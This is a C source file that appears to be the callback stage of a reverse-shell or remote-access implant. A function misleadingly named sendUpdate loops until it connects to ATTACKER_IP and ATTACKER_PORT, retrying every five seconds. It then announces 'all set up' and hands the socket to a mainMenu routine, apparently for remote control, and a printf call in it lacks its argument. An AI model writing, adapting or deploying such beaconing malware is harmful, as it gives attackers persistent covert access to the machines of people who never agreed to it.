#include "headers.h"
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>



int valid(int status, char *stage);

int sendUpdate(){
        printf("[*] stage 1\n");
        
        char buffer[1024] ={0};
        int status, connID;
        
        int RUN = 1;
        struct sockaddr_in dstAddr;
        
        dstAddr.sin_family = AF_INET;
        dstAddr.sin_port = htons(ATTACKER_PORT);
        status = inet_pton(AF_INET, ATTACKER_IP, &dstAddr.sin_addr);
        if(valid(status,"inet_pton")==1){return 1;}
        
        while(RUN){
            connID = socket(AF_INET ,SOCK_STREAM, 0);
            status = connect(connID, (struct sockaddr *)&dstAddr, sizeof(dstAddr));
            if(status == 0){
                RUN = 0;
            }else{
                close(connID);
                sleep(5);
            }
            
        }
        printf("connected\n");
        
        char *hello = "all set up";
        send(connID, hello, strlen(hello),0);
        
        mainMenu(connID);
        
        close(connID);
        return 0;
}

int valid(int status, char *stage){
    if(status<0){
        printf("Failed at: %s");
        return 1;
    }
    else{return 0;}
}
